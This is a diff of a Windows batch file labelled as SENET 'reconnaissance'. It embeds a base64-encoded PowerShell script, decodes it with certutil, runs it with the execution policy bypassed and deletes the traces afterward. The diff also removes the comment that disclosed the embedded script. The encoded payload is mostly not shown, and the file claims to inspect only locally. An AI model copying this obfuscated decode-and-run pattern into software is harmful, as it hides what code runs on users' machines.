@@ -1,9 +1,6 @@
 @echo off
-rem ------------------------------------------------------------------
 rem  Orda - SENET reconnaissance. Single self-contained file.
-rem  PowerShell script embedded as base64 (ASCII-safe).
 rem  Run under the SENET CLIENT account with an ACTIVE session.
-rem ------------------------------------------------------------------
 chcp 65001 >nul
 title Orda - SENET scan
 setlocal
@@ -14,7 +11,6 @@ if exist "%PS1%" del /q "%PS1%"
 
 echo.
 echo   SENET scan. Nothing is uploaded - local inspection only.
-echo   Please wait...
 echo.
 
 >>"%B64%" echo 77u/PCMKLlNZTk9QU0lTCiAgICDQoNCw0LfQstC10LTQutCwIFNFTkVUIOKAlCDQs9C00LUg0YfR
@@ -407,11 +403,7 @@ echo.
 >>"%B64%" echo kSDQvtGC0YDQsNCx0L7RgtCw0LvQvi4KZXhpdCAwCg==
 
 certutil -decode "%B64%" "%PS1%" >nul
-if errorlevel 1 (
-  echo   Failed to decode the embedded script.
-  pause
-  exit /b 1
-)
+if errorlevel 1 ( echo   Decode failed. & pause & exit /b 1 )
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command "$ScanRoot='%~dp0'; & '%PS1%'"
 
@@ -419,7 +411,7 @@ del /q "%B64%" >nul 2>&1
 del /q "%PS1%" >nul 2>&1
 
 echo.
-echo   Report saved next to this file: senet-scan-report.txt
+echo   Report: senet-scan-report.txt
 echo.
 pause
 endlocal
